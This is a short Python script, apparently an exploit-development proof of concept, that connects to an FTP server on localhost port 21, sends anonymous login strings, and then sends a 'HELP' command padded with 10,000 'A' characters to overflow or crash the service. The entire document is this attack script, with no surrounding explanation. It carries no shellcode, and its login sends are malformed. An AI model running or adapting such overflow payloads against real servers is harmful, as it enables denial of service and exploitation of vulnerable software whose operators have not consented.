#!/usr/bin/python

import sys, socket


cmd = "HELP "
junk = "\x41" * 10000
end = "\r\n"

buffer = cmd + junk + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 21))
s.send("anonymous")
s.send("123456")


s.send(buffer)
s.recv(1024)
s.close()
